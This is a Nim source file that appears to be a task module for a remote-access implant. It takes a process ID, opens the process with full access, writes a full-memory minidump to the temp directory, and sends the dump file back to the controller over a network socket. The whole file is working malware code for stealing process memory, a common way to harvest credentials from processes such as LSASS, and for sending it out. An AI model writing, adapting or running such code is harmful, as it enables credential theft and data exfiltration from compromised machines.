import ../client/communication
from std/net import Socket 
import json, strutils, os
import winim/[lean]

type
  MINIDUMP_TYPE = enum
    MiniDumpWithFullMemory = 0x00000002

proc MiniDumpWriteDump(
  hProcess: HANDLE,
  ProcessId: DWORD, 
  hFile: HANDLE, 
  DumpType: MINIDUMP_TYPE, 
  ExceptionParam: INT, 
  UserStreamParam: INT,
  CallbackParam: INT
): BOOL {.importc: "MiniDumpWriteDump", dynlib: "dbghelp", stdcall.}

proc executeTask*(socket: net.Socket, taskId: int, params: seq[string]) =
  let taskOutput = TaskOutput(
    task: "output",
    taskId: taskId,
    error: "",
    data: %*{}
  )
  let tempdir = getTempDir()
  let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](parseInt(params[0])))
  if not bool(hProcess):
    taskOutput.error = "could not open process with PID " & params[0]
    socket.sendOutput(taskOutput)
    return

  var fs = open(tempdir & "/" & params[0] & ".dump", fmWrite)
  if MiniDumpWriteDump(
        hProcess,
        cast[DWORD](parseInt(params[0])),
        fs.getOsFileHandle(),
        MiniDumpWithFullMemory,
        0,
        0,
        0
      ):
    taskOutput.addData(DataType.File, params[0] & "_dump.dump", readFile(tempdir & "/" & params[0] & ".dump")) 
  else:
    taskOutput.error = "failed to write dump for process with PID " & params[0]
  
  socket.sendOutput(taskOutput)